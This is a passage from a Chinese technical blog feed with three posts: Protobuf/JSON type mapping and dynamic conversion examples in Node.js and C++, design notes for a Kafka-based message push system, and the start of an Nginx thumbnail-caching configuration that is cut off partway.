</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">sint64</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">fixed32</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">fixed64</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">sfixed32</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">sfixed64</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">bool</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">string</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">bytes</td>
</tr>
</tbody>
<tbody>
<tr>
<td class="org-left">Json</td>
<td class="org-left">文本</td>
<td class="org-left">是</td>
<td class="org-left">否</td>
<td class="org-left">较少</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">string</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">number</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">bool</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">null</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">number 整型取值范围[-(2**53-1), 2**53-1]</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">因此不能精确转换为 int64 或 uint64 类型</td>
</tr>
</tbody>
</table>

<p>
参考
</p>

<p>
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number">Number - JavaScript | MDN</a>
</p>

<p>
<a href="https://developers.google.com/protocol-buffers/docs/proto3#scalar">Language Guide (proto3)  |  Protocol Buffers  |  Google Developers</a>
</p>
</div>
</div>

<div id="outline-container-org98003d3" class="outline-2">
<h2 id="org98003d3">Protobuf 与 Json 的静态转换</h2>
<div class="outline-text-2" id="text-org98003d3">
<p>
使用 protoc 生成 proto 文件的编解码代码，再手工进行 Protobuf 与 Json 格式转换是很容易的，
但是这需要在 proto 文件更新时重新生成代码，并重新编译、部署程序。
</p>
</div>
</div>

<div id="outline-container-org0cd3bd0" class="outline-2">
<h2 id="org0cd3bd0">Protobuf 与 Json 的动态转换</h2>
<div class="outline-text-2" id="text-org0cd3bd0">
<p>
如果程序能够解析 proto 文件，并根据 proto 定义完成 Protobuf 与 Json 的转换会很有用处。
</p>
</div>

<div id="outline-container-org654b78a" class="outline-3">
<h3 id="org654b78a">example.proto</h3>
<div class="outline-text-3" id="text-org654b78a">
<p>
以下为接下来要使用的 <code>example.proto</code> 文件内容
</p>

<div class="org-src-container">
<pre class="src src-protobuf">syntax = <span style="color: #8abeb7;">"proto3"</span>;

<span style="color: #b5bd68;">package</span> <span style="color: #81a2be;">example</span>;

<span style="color: #b5bd68;">message</span> <span style="color: #81a2be;">Hello</span> {
  <span style="color: #81a2be;">string</span> <span style="color: #f0c674;">name</span> = 1;
  <span style="color: #81a2be;">int32</span> <span style="color: #f0c674;">times</span> = 2;
}
</pre>
</div>
</div>
</div>

<div id="outline-container-orgc11ad08" class="outline-3">
<h3 id="orgc11ad08">Node.js</h3>
<div class="outline-text-3" id="text-orgc11ad08">
<p>
在查找 Node.js 下 Protobuf 使用相关资料的过程中，发现 Node.js 可以直接载入 proto 文件，
然后直接获取 Protobuf 编解码对象进行 Protobuf 的编解码，如下所示：
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">ProtoBuf</span> = require(<span style="color: #8abeb7;">"protobufjs"</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">dgram</span> = require(<span style="color: #8abeb7;">'dgram'</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">server</span> = dgram.createSocket(<span style="color: #8abeb7;">'udp4'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">builder</span> = ProtoBuf.loadProtoFile(<span style="color: #8abeb7;">"./cover.helloworld.proto"</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   Cover = builder.build(<span style="color: #8abeb7;">"cover"</span>),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   HelloCoverReq = Cover.helloworld.helloCoverReq;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   HelloCoverRsp = Cover.helloworld.helloCoverRsp;
</pre>
</div>
<p>
引用自 <a href="http://imweb.io/topic/570130a306f2400432c1396c">在NodeJS中玩转Protocol Buffer - 腾讯Web前端 IMWeb 团队社区 | blog | 团队博客</a>
</p>

<p>
这就是动态语言的优势，而且 Javascript 原生支持 Json，用来演示再合适不过。
</p>

<p>
以下为完整的 Protobuf 与 Json 动态互转示例代码：
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #8abeb7;">"use strict"</span>;

<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">ProtoBuf</span> = require(<span style="color: #8abeb7;">"protobufjs"</span>);
<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">util</span> = require(<span style="color: #8abeb7;">'util'</span>);
<span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">assert</span> = require(<span style="color: #8abeb7;">'assert'</span>);

ProtoBuf.load(<span style="color: #8abeb7;">"./example.proto"</span>).then((root) =&gt; {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">Hello</span> = root.lookup(<span style="color: #8abeb7;">'example.Hello'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">source</span> = {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   name: <span style="color: #8abeb7;">"world"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   times: 100
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   };
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">hello</span> = Hello.create(source);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">buffer</span> = Hello.encode(hello).finish();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">const</span> <span style="color: #f0c674;">destination</span> = Hello.decode(buffer);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   assert(JSON.stringify(source) == JSON.stringify(destination));

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log({
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   source: JSON.stringify(source),
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   destination: JSON.stringify(destination)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
});
</pre>
</div>

<p>
运行结果
</p>
<pre class="example">
$ node /home/tangxinfa/Examples/learn_node/protobuf_json.js
{ source: '{"name":"world","times":100}',
  destination: '{"name":"world","times":100}' }
</pre>
</div>
</div>

<div id="outline-container-orge4a7343" class="outline-3">
<h3 id="orge4a7343">C++</h3>
<div class="outline-text-3" id="text-orge4a7343">
<p>
C++ 是静态类型的语言，肯定不如 Node.js 那么方便，主要用到 Protobuf 的反射（Reflection）机制，具体实现见：
</p>

<ul class="org-ul">
<li><a href="https://github.com/HaustWang/pb2json">HaustWang/pb2json: protobuf message与json互转，使用C++11特性</a></li>

<li><a href="https://github.com/shafreeck/pb2json">https://github.com/shafreeck/pb2json</a></li>

<li><a href="https://github.com/shramov/json2pb">shramov/json2pb: Python/C++ implementation of JSON to/from Protobuf convertor</a></li>
</ul>


<p>
<a href="https://github.com/HaustWang/pb2json">HaustWang/pb2json</a> 实现了静态和动态 Protobuf 与 Json 互转，这里以它写一个完整的示例
</p>

<ul class="org-ul">
<li><p>
拉取 <a href="https://github.com/HaustWang/pb2json">HaustWang/pb2json</a> 代码
</p>

<div class="org-src-container">
<pre class="src src-sh">git clone https://github.com/HaustWang/pb2json.git
</pre>
</div></li>

<li><p>
protobuf_json.cpp
</p>

<div class="org-src-container">
<pre class="src src-cpp"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">"pb2json/byReflection/pb2json.h"</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;google/protobuf/compiler/importer.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;google/protobuf/dynamic_message.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;iostream&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;string&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;cassert&gt;</span>
<span style="color: #b5bd68;">using</span> <span style="color: #81a2be;">std</span>::<span style="color: #81a2be;">string</span>;

<span style="color: #b5bd68;">class</span> <span style="color: #81a2be;">ErrorCollector</span>: <span style="color: #b5bd68;">public</span> <span style="color: #81a2be;">google</span>::<span style="color: #81a2be;">protobuf</span>::<span style="color: #81a2be;">compiler</span>::<span style="color: #81a2be;">MultiFileErrorCollector</span><span style="text-decoration: underline;"> {</span>
<span style="color: #b5bd68;">public</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #de935f;">ErrorCollector</span>()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> :warnings_(0), errors_(0)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> {}
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">virtual</span> ~<span style="color: #de935f;">ErrorCollector</span>() {}
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">virtual</span> <span style="color: #81a2be;">void</span> <span style="color: #de935f;">AddError</span>(<span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">string</span>&amp; <span style="color: #f0c674;">filename</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">line</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">column</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">string</span>&amp; <span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ++errors_;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">std</span>::cerr &lt;&lt; filename &lt;&lt; <span style="color: #8abeb7;">":"</span> &lt;&lt; line &lt;&lt; <span style="color: #8abeb7;">":"</span> &lt;&lt; column &lt;&lt; <span style="color: #8abeb7;">": "</span> &lt;&lt; message &lt;&lt; <span style="color: #81a2be; text-decoration: underline;">std</span><span style="text-decoration: underline;">::endl;</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">virtual</span> <span style="color: #81a2be;">void</span> <span style="color: #de935f;">AddWarning</span>(<span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">string</span>&amp; <span style="color: #f0c674;">filename</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">line</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">column</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">string</span>&amp; <span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ++warnings_;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">std</span>::cerr &lt;&lt; filename &lt;&lt; <span style="color: #8abeb7;">":"</span> &lt;&lt; line &lt;&lt; <span style="color: #8abeb7;">":"</span> &lt;&lt; column &lt;&lt; <span style="color: #8abeb7;">": "</span> &lt;&lt; message &lt;&lt; <span style="color: #81a2be; text-decoration: underline;">std</span><span style="text-decoration: underline;">::endl;</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">uint</span> <span style="color: #de935f;">errors</span>() <span style="color: #b5bd68;">const</span> { <span style="color: #b5bd68;">return</span> errors_; }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">uint</span> <span style="color: #de935f;">warnings</span>() <span style="color: #b5bd68;">const</span> { <span style="color: #b5bd68;">return</span> warnings_; }

<span style="color: #b5bd68;">private</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">uint</span> <span style="color: #f0c674;">errors_</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">uint</span> <span style="color: #f0c674;">warnings_</span>;
};


<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[]) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">parse proto file with protobuf compiler module,</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">also can generate self-described protobuf message with protoc,</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">then we can get file descriptor without protobuf compiler,</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">see https://developers.google.com/protocol-buffers/docs/techniques#self-des</span><span style="color: #969896; font-style: italic; text-decoration: underline;">cription</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">google</span>::<span style="color: #81a2be;">protobuf</span>::<span style="color: #81a2be;">compiler</span>::<span style="color: #81a2be;">DiskSourceTree</span> <span style="color: #f0c674;">sourceTree</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> sourceTree.MapPath(<span style="color: #8abeb7;">""</span>, <span style="color: #8abeb7;">"."</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">ErrorCollector</span> <span style="color: #f0c674;">collector</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">google</span>::<span style="color: #81a2be;">protobuf</span>::<span style="color: #81a2be;">compiler</span>::<span style="color: #81a2be;">Importer</span> <span style="color: #f0c674;">importer</span>(&amp;sourceTree, &amp;collector);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">proto_file</span> = <span style="color: #8abeb7;">"example.proto"</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">google</span>::<span style="color: #81a2be;">protobuf</span>::<span style="color: #81a2be;">FileDescriptor</span>* <span style="color: #f0c674;">fileDescriptor</span> = importer.Import(proto<span style="text-decoration: underline;">_file);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (fileDescriptor == <span style="color: #81a2be;">NULL</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">std</span>::cerr &lt;&lt; <span style="color: #8abeb7;">"proto file "</span> &lt;&lt; proto_file &lt;&lt; <span style="color: #8abeb7;">" import failed"</span> &lt;&lt; <span style="color: #81a2be;">std</span>::endl;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> EXIT_FAILURE;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">google</span>::<span style="color: #81a2be;">protobuf</span>::<span style="color: #81a2be;">Descriptor</span>* <span style="color: #f0c674;">descriptor</span> = fileDescriptor-&gt;FindMessageTy<span style="text-decoration: underline;">peByName(</span><span style="color: #8abeb7; text-decoration: underline;">"Hello"</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(descriptor);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">google</span>::<span style="color: #81a2be;">protobuf</span>::<span style="color: #81a2be;">DynamicMessageFactory</span> <span style="color: #f0c674;">factory</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">google</span>::<span style="color: #81a2be;">protobuf</span>::<span style="color: #81a2be;">Message</span>* <span style="color: #f0c674;">prototype</span> = factory.GetPrototype(descriptor);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(prototype);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">google</span>::<span style="color: #81a2be;">protobuf</span>::<span style="color: #81a2be;">Message</span>* <span style="color: #f0c674;">message</span> = prototype-&gt;New();
<span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(message);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">string</span> <span style="color: #f0c674;">source</span> = <span style="color: #8abeb7;">"{\"name\":\"world\",\"times\":100}"</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">bool</span> <span style="color: #f0c674;">ok</span> = <span style="color: #81a2be;">Pb2Json</span>::Json2Message(<span style="color: #81a2be;">nlohmann</span>::<span style="color: #81a2be;">json</span>::parse(source), *message);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(ok);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">nlohmann</span>::<span style="color: #81a2be;">json</span> <span style="color: #f0c674;">destinationJson</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">Pb2Json</span>::Message2Json(*message, destinationJson);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">string</span> <span style="color: #f0c674;">destination</span> = destinationJson.dump();

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">std</span>::cout &lt;&lt; <span style="color: #8abeb7;">"source: "</span> &lt;&lt; source &lt;&lt; <span style="color: #8abeb7;">"\tdestination: "</span> &lt;&lt; destination &lt;&lt; <span style="color: #81a2be;">std</span>::<span style="text-decoration: underline;">endl;</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> assert(source == destination);

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> EXIT_SUCCESS;
}
</pre>
</div>

<ul class="org-ul">
<li><p>
编译
</p>

<div class="org-src-container">
<pre class="src src-sh">g++ -O2 protobuf_json.cpp ./pb2json/byReflection/pb2json.cpp -lm -o protobuf_jso<span style="text-decoration: underline;">n -lprotobuf</span>
</pre>
</div></li>

<li><p>
运行
</p>

<pre class="example">
$ ./protobuf_json
source: {"name":"world","times":100}    destination: {"name":"world","times":100}
</pre></li>
</ul></li>
</ul>


<p>
相关参考
</p>

<ul class="org-ul">
<li><a href="http://blog.csdn.net/haust_wang/article/details/49994883">c++使用Protobuf Message转Json字符串（Json库使用Json cpp） - - CSDN博客</a></li>

<li><a href="http://blog.csdn.net/haust_wang/article/details/50135967">Protobuf与Json互转 - - CSDN博客</a></li>

<li><a href="https://stackoverflow.com/questions/7007876/c-protobuf-to-from-json-conversion">C++ Protobuf to/from JSON conversion - Stack Overflow</a></li>

<li><a href="https://stackoverflow.com/questions/11996557/how-to-dynamically-build-a-new-protobuf-from-a-set-of-already-defined-descriptor">c++ - How to dynamically build a new protobuf from a set of already defined descriptors? - Stack Overflow</a></li>

<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gpb/#minor4.2">Google Protocol Buffer 的使用和原理</a></li>

<li><a href="https://developers.google.com/protocol-buffers/docs/reference/cpp/">C++ API  |  Protocol Buffers  |  Google Developers</a></li>
</ul>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[基于 Kafka 的消息推送系统设计]]></title>
            <link>/article/57fa4e8e-kafka-76846d88606f63a890017cfb7edf8bbe8ba1.html</link>
            <guid>/article/57fa4e8e-kafka-76846d88606f63a890017cfb7edf8bbe8ba1.html</guid>
            <pubDate>Tue, 19 Sep 2017 07:02:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgdc5954d" class="outline-2">
<h2 id="orgdc5954d">适用于消息推送系统的 Kafka 特性</h2>
<div class="outline-text-2" id="text-orgdc5954d">
<ul class="org-ul">
<li><p>
高可用性
</p>

<p>
Kafka 能够保证不丢消息。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
高性能
</p>

<p>
QPS 轻松上万。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
可扩展
</p>

<p>
可搭建包含上千结点的集群。
</p></li>
</ul>
</div>
</div>


<div id="outline-container-org3959cbf" class="outline-2">
<h2 id="org3959cbf">不适用于消息推送系统的 Kafka 特性</h2>
<div class="outline-text-2" id="text-org3959cbf">
<ul class="org-ul">
<li><p>
有限的 Partition 数量
</p>

<p>
Partition 是 Kafka 并发的基本单位，创建上万的 Partition 会影响可用性，见
《<a href="https://www.confluent.io/blog/how-to-choose-the-number-of-topicspartitions-in-a-kafka-cluster/">How to choose the number of topics/partitions in a Kafka cluster? - Confluent</a>》，
消息推送系统往往用户量巨大（百万＋），意味着不能通过每用户一 Partition 将 Kafka 做为消息的主要存储层。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
队列中的数据可能积压
</p>

<p>
Kafka 主要用于离线数据处理，数据没有太强的时效要求。
推送的消息往往有时效性，过期就失去意义了，消息队列堵塞后，
系统需要将队列中的数据消费掉，才好继续提供服务。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
处理结果难以反馈给调用者
</p>

<p>
如果一条消息通过消息队列传输到另一个模块进行处理，就很难将处理结果同步地传回调用方。
使用消息队列就意味着为了知道处理结果，调用方要异步地接收结果通知，也就意味着要唯一地标识请求消息以便与通知进行配对。
需要反馈的情形更适合使用 RPC 调用，可以考虑在 Kafka 之上封装 RPC 调用。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
Kafka 主要用于内部系统间通信
</p>

<p>
消费者和生产者一般要求是固定且7x24小时在线，通常为后台服务程序。
而消息推送系统的客户端一般是在线不稳定，接入点不固定，需要支持离线消息。
内部的稳定性与外部的不稳定性会带来冲突，这两者的交接处需要进行复杂的处理。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
消息的追踪与流控会成为问题
</p>

<p>
消息可能滞留在某个 Kafka 、MySQL、内存中，因此会很难实现用户级、业务级、系统级的流控，
业务服务器或客户端如果投递了过量的消息，会影响整个系统。
</p></li>
</ul>
</div>
</div>


<div id="outline-container-org3b6501c" class="outline-2">
<h2 id="org3b6501c">如何基于 Kafka 构建消息推送系统</h2>
<div class="outline-text-2" id="text-org3b6501c">
<ul class="org-ul">
<li><p>
分而治之
</p>

<p>
将海量的用户空间静态垂直划分到单个消息处理结点可掌控的粒度。
</p>

<p>
比如将 <code>uid % 100</code> 分布到 100 个消息处理结点结点上，如果总共有 1000 万在线用户的话，每个消息处理结点只负责 10 万在线用户，完全可以将大部分状态放置在内存中，避免远程访问数据服务。
</p>

<p>
消息处理结点间尽量不共享状态，各自存储属于自已的消息数据，通过往各自的 Kafka 投递消息进行交互。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
做为消息存储设施的一部分
</p>

<p>
Kafka 是一种可靠的数据存储设施，可以认为它是只能进行顺序读取的存储设施。
</p>

<p>
用户的上线、下线没有规律可言，也就是说有着天然的随机性。
</p>

<p>
随机的读写还是通过 MySQL，可将 Kafka 用于顺序存储的场景，如：
</p></li>
</ul>
<p>
　在线用户的消息发送与投递、离线消息或需要确认的消息的入库。
</p>


<ul class="org-ul">
<li><p>
谨慎地处理时序问题
</p>

<p>
一个消息通过 MQ 发往 MySQL 进行存储，然后往用户发送该消息，收到用户发回的确认消息后，
通过 MQ 往 MySQL 要求删除该消息，此时无法保证该消息已经写入 MySQL。
</p>

<p>
这正是分布式系统所要面对的时序问题。
</p>

<p>
对异步消息进行并行处理必然会带来无序，需要将同一用户的所有消息都调度到一个协程（或线程）进行顺序处理。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
做为系统级消息总线
</p>

<p>
消息处理结点与其它系统模块（如：离线消息模块）交互也通过 Kafka 来进行。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
消息队列需要好的监控及运维
</p>

<p>
队列堵塞会导致消息处理不及时，消息可能已经无效，需要进行处理。
而使用消息队列意味着不允许失败，必须在承诺的期限内给出可预期的结果，
也就是说无法为特定用户提供定制化的投递超时设置。</p></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Nginx 自动生成并缓存缩略图]]></title>
            <link>/article/nginx-81ea52a8751f62105e767f135b587f29756556fe.html</link>
            <guid>/article/nginx-81ea52a8751f62105e767f135b587f29756556fe.html</guid>
            <pubDate>Wed, 30 Aug 2017 06:35:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org0a7f8ba" class="outline-2">
<h2 id="org0a7f8ba">配置示例</h2>
<div class="outline-text-2" id="text-org0a7f8ba">
<div class="org-src-container">
<pre class="src src-conf"><span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#35775;&#38382;&#21407;&#22987;&#22270;&#29255;</span>
<span style="color: #81a2be;">location /image</span> {
    root /data;
}

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#35775;&#38382;&#32553;&#30053;&#22270;&#29255;</span>
<span style="color: #81a2be;">location ~* ^/thumbnail/(.*)$</span> {
    alias /data/thumbnail;

    <span style="color: #81a2be;">if (!-f $request_filename)</span> {
        proxy_pass http://127.0.0.1/_thumbnail/$1;
        break;
    }

    proxy_set_header     Host $http_host;
    proxy_store          /data/thumbnail/$1;
